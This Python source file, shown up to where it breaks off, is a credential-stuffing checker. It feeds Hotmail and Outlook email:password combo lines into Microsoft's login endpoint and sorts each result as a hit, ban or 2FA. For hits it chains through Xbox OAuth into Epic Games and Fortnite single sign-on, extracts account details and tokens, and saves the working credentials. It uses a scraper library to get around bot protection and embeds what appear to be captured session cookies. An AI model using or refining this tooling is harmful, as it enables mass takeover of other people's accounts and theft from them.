from concurrent.futures import ThreadPoolExecutor
import requests
import re
import urllib.parse
import cloudscraper
import os
from threading import Thread
import time
from colorama import Fore, init
from ctypes import windll
import random
import string
import psutil

def prints(line):
    print(f'{line}')

def parse_url(url):
    match = re.search(r"[&?]route=([^&]*)", url)
    return match.group(1) if match else None

def parse_source_for_url(source):
    match = re.search(r"urlPost:'(.*?)'", source)
    if match:
        url = match.group(1)
        return url
    return None

def check_domain(line):
    emails_regex = r'[a-zA-Z0-9\.+_?!$%#^&*()=?\\|,-]+@+(live.fr|live.com|outlook.co.uk|hotmail.co.uk|live.fr|hotmail.fr|outlook.fr|outlook.com|hotmail.com|outlook.com.br|hotmail.com.br|outlook.it|hotmail.it)+:+[a-zA-Z0-9\.-_=+!@#$%^&*()?\\,]+' 
    res = re.search(emails_regex, line)
    if res:
        return True
    
    return False

def check_combo_folder():
    if os.path.exists('combo'):
        return
    else:
        os.makedirs('combo')
        return
    
def parse_1(text):
    dis_match = re.search(r'"lastName":"(.*?)","email":"(.*?)"', text)
    if dis_match:
        dis = dis_match.group(0)
    else:
        dis = None
    try:
        display_name_match = re.search(r'"displayName":"(.*?)"', dis) # type: ignore
        if display_name_match:
            display_name = display_name_match.group(1)
        else:
            display_name = None
        country_match = re.search(r'"country":"(.*?)"', dis) # type: ignore
        if country_match:
            country = country_match.group(1)
        else:
            country = None
        accid_match = re.search(r'"id":"(.*?)"', dis) # type: ignore
        if accid_match:
            accid = accid_match.group(1)
        else:
            accid = None
        email_verified_match = re.search(r'"emailVerified":(.*?)(,|\})', dis) # type: ignore
        if email_verified_match:
            email_verified_status = email_verified_match.group(1).strip()
        else:
            email_verified_status = None
    except:
        display_name = 'Error'
        country = 'Error'
        accid = 'Error'
        email_verified_status = 'Unknown'
    return display_name,country,accid,email_verified_status

def set_cpu_limit():
    cpus = psutil.cpu_count() // 2
    p = psutil.Process(os.getpid())
    cpus_to_use = []
    for i in range(cpus):
        cpus_to_use.append(i)
    p.cpu_affinity(cpus_to_use)
    
            
skins_data = []
sellerstuff = []
toomany = []

def check(line):
    global ms_hits, spam, total_lines, checked, failed
    windll.kernel32.SetConsoleTitleW(f'AK - V.2 - Checked: {checked}/{total_lines} - Failed: {failed} - MS-HIT: {ms_hits} - Retries: {spam}')
    user = line.split(':')[0].strip()
    password = line.split(':')[1].strip()
    folder = 'Results'
    # print(line)
    session = requests.sessions.session()
    scraper = cloudscraper.create_scraper()
    url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
            
    headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Length": "814",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\""
    }
    payload = {
        "i13": "0",
        "login": user,
        "loginfmt": user,
        "type": "11",
        "LoginOptions": "3",
        "lrt": "",
        "lrtPartition": "",
        "hisRegion": "",
        "hisScaleUnit": "",
        "passwd": password,
        "ps": "2",
        "psRNGCDefaultType": "1",
        "psRNGCEntropy": "",
        "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
        "canary": "",
        "ctx": "",
        "hpgrequestid": "",
        "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
        "PPSX": "Passp",
        "NewUser": "1",
        "FoundMSAs": "",
        "fspost": "0",
        "i21": "0",
        "CookieDisclosure": "0",
        "IsFidoSupported": "1",
        "isSignupPost": "0",
        "isRecoveryAttemptPost": "0",
        "i19": "21648"
    }
    while True:
        try:
            response = session.post(url, headers=headers, data=payload)
            if 'Too Many Requests' in response.text:
                toomany.append(line)
                # print(f'{red}[SPAM] - {white}{line}{rescolor}')
                spam += 1
                return
        except:
            continue
        break

    r = response
    failure_keywords = [
        "Your account or password is incorrect.",
        "That Microsoft account doesn\\'t exist. Enter a different account",
        "Sign in to your Microsoft account",
        'const trackingBase="https://tracking.epicgames.com,https://tracking.unrealengine.com"',
        'Please sign in with a Microsoft account or create a new account',
    ]

    ban_keywords = [
                        ",AC:null,urlFedConvertRename",
                    ]


    two_factor_keywords = [
                        "account.live.com/recover?mkt",
                        "recover?mkt",
                        "account.live.com/identity/confirm?mkt",
                        "Email/Confirm?mkt",
                        "Help us protect your account",
                    ]

    custom_keywords = [
                        "/cancel?mkt=",
                        "/Abuse?mkt=",
                    ]
    cookies = r.cookies.get_dict()
    result = 'Unknown'
    if any(keyword in r.text.strip() for keyword in failure_keywords):
        result = 'Failure'
    elif any(keyword in r.text.strip() for keyword in ban_keywords):
        result = 'Ban'
    elif any(keyword in r.text.strip() for keyword in two_factor_keywords):
        result = '2FACTOR'
    elif any(keyword in r.text.strip() for keyword in custom_keywords):
        result = "CUSTOM"
    elif any(keyword in cookies for keyword in ["ANON", "WLSSC"]) or \
    any(keyword in r.url for keyword in ["https://login.live.com/oauth20_desktop.srf?"]) or \
    "sSigninName" in r.text.strip():
        result = "Success"

    if result == 'Failure' or result == '2FACTOR' or result == 'Ban' or result == 'CUSTOM' or result == 'Unknown':
        failed += 1
        checked += 1
        return
    else:
        url = parse_source_for_url(response.text)
        rr = parse_url(url)  
        o_params = session.cookies['OParams']
        msa = session.cookies["__Host-MSAAUTH"]
        url2 = f'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216&opid=F7304AA192830107&route={rr}'
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Length": "267",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; wlidperf=FR=L&ST=1701944522902; __Host-MSAAUTH={msa}; PPLState=1; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36a$uuid-dd8bae77-7811-4d1e-82dc-011f340afefe; OParams={o_params}",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216",
            "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
        }
        while True:
            try:
                response = session.post(url2, headers=headers, data=payload)
                if 'id/oauth-authorized?code=' in response.url:
                    break
                else:
                    # print(f'{lgreen}[MS-HIT] - {white}{line}{rescolor}')
                    ms_hits += 1
                    checked +=1
                    return
            except:
                continue

        parsed_url = urllib.parse.urlparse(response.url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        code = query_params.get('code', [None])[0]
        url = "https://www.epicgames.com/id/api/reputation"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en;q=0.5",
            "Connection": "keep-alive",
            "DNT": "1",
            "Host": "www.epicgames.com",
            "Priority": "u=0, i",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
        }

        response = scraper.get(url, headers=headers)
        cookies = response.cookies.get_dict()
        cookies.get('EPIC_SESSION_REPUTATION')
        cookies.get('EPIC_SESSION_AP')
        xsrf_token_cookie = cookies.get('XSRF-TOKEN')
        
        url = "https://www.epicgames.com/id/api/external/xbl/login"
        payload = {
            "code": f'{code}'
        }
        headers = {
            "POST": "/id/api/external/xbl/login HTTP/1.1",
            "Host": "www.epicgames.com",
            "Connection": "keep-alive",
            "X-Epic-Event-Category": "null",
            "X-XSRF-TOKEN": xsrf_token_cookie,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 OPR/74.0.3911.107 (Edition utorrent)",
            "X-Epic-Event-Action": "null",
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "X-Epic-Strategy-Flags": "guardianEmailVerifyEnabled=false;guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false",
            "Origin": "https://www.epicgames.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.epicgames.com/id/login/xbl?prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiJmN2MxODNkMzczYmQ0NzMxYTMxYjVjN2NlMGViNzE1ZSIsImlzV2ViIjp0cnVlLCJpcCI6IjE5Ny4yNi4xMzguMjE2IiwiaWQiOiIwMjEwYTIyNTcyMjU0ZDYzOTg1ZGFjOGU4NmM4MGVlZSIsImNvZGUiOiJNLlIzX0JBWS5mYzRjZGZjNi1iMTQ5LTNhN2YtYzZmNC1jZWMzY2Y3MDZmMDkifQ%253D%253D",
            "Accept-Language": "en-US,us;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "56"  
        }

        while True:
            try:
                response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies)
                break
            except:
                continue

        if 'message":"Two-Factor authentication' in response.text :
            print(f'{blue}[2FA] - {white}{line}{rescolor}')
            if not os.path.exists(folder + '/2FA'):
                os.makedirs(folder + '/2FA')
            open(f'{folder}/2FA/all.txt', 'a',
            encoding='u8').write(f'{line}\n')
            checked += 1
            time.sleep(0.1)
            return
        elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
            print(f'{red}[HEADLESS] - {white}{line}{rescolor}')
            checked +=1
            return
        elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
            print(f'{yellow}[XBOX] - {white}{line}{rescolor}')
        elif 'code is required' in response.text:
            print(f'Code Required: {line}{rescolor}')
            return
        
        url = "https://www.epicgames.com/id/api/csrf"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en;q=0.5",
            "Connection": "keep-alive",
            "DNT": "1",
            "Host": "www.epicgames.com",
            "Priority": "u=0, i",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
        }
        response2 = scraper.get(url, headers=headers, cookies=response.cookies)
        
        url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Priority": "u=1, i",
            "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
            "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Epic-Access-Key": "undefined",
            "X-Epic-Client-Id": "875a3b57d3a640a6b7f9b4e883463ab4",
            "X-Epic-Display-Mode": "web",
            "X-Epic-Duration": "2173",
            "X-Epic-Event-Action": "external",
            "X-Epic-Event-Category": "login",
            "X-Epic-Flow": "login",
            "X-Epic-Idp-Provider": "xbl",
            "X-Epic-Platform": "WEB",
            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
            "X-Requested-With": "XMLHttpRequest",
            "X-Xsrf-Token": xsrf_token_cookie
        }

        response = scraper.get(url, headers=headers, cookies=response2.cookies)
        if 'Sorry, your account has too many active logins' in response.text:
                print(f'{green}[HIT-NC] - {white}{line}{rescolor}')
                if not os.path.exists(folder + '/NoCapture'):
                    os.makedirs(folder + '/NoCapture')
                open(f'{folder}/NoCapture/all.txt', 'a',
                encoding='u8').write(f'{line}\n')
                checked +=1
                time.sleep(0.1)
                return
        
        elif '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                # print(f'{yellow}[XBOX-BAN] - {white}{line}{rescolor}')
                checked +=1
                return
        try:
            sid = response.json()
            sid = sid.get("sid")
        except:
            print(f'{yellow}[XBOX-BAN] - {white}{line}{rescolor}')
            checked += 1
            return
        url = f"https://www.epicgames.com/id/api/sso?sid={sid}"
        headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Priority": "u=0, i",
                "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
                "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": "\"Windows\"",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        }

        while True:
            try:
                response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
                if 'https://www.unrealengine.com:443/id/api/sso?sid=' in response.headers['location']:
                    url = response.headers['location']
                    break
            except:
                continue

        headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Priority": "u=0, i",
        "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        }
        
        while True:
            try:
                response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
                if 'https://www.twinmotion.com:443/id/api/sso?sid=' in response.headers['location']:
                    url = response.headers['location']
                    break
                else:
                    print(response.url)
                    break
            except:
                print('Line 445')
                continue
        
        while True:
            try:
                response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
                if 'https://www.fortnite.com:443/id/api/sso?' in response.headers['location']:
                    url = response.headers['location']
                    break
                else:
                    print(response.url)
                    break
            except:
                continue
        
        while True:
            try:
                response = scraper.get(url, headers=headers, cookies=response.cookies)
                if 'eg1~' in response.cookies['REFRESH_EPIC_EG1']:
                    break
                else:
                    print('eg1 not found retry')
                    continue
            except:
                continue
        display_name, country, accid, email_verified_status = parse_1(response.text)

        url = "https://www.epicgames.com/id/api/redirect?"
        headers = {
            "Host": "www.epicgames.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/16.7.0-34134031+++Portal+Release-Live UnrealEngine/4.27.0-34134031+++Portal+Release-Live Chrome/90.0.4430.212 Safari/537.36",
            "X-Epic-Access-Key": "undefined",
            "X-Epic-Client-ID": "undefined",
            "X-Epic-Display-Mode": "web",
            "X-Epic-Duration": "375170",
            "X-Epic-Event-Action": "reminder",
            "X-Epic-Event-Category": "login",
            "X-Epic-Flow": "login",
            "X-Epic-Platform": "WEB",
            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
            "X-Requested-With": "XMLHttpRequest",
            "X-XSRF-TOKEN": xsrf_token_cookie,
            "sec-ch-ua": "\"Chromium\";v=\"90\"",
            "sec-ch-ua-mobile": "?0",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.epicgames.com/id/login",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate"
        }

        response = scraper.get(url, headers=headers, cookies=response.cookies)
        ex_match = re.search(r'"exchangeCode":"(.*?)"', response.text)
        if ex_match:
            ex = ex_match.group(1)
            url = "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token"
            payload = {
                "grant_type": "exchange_code",
                "exchange_code": ex,
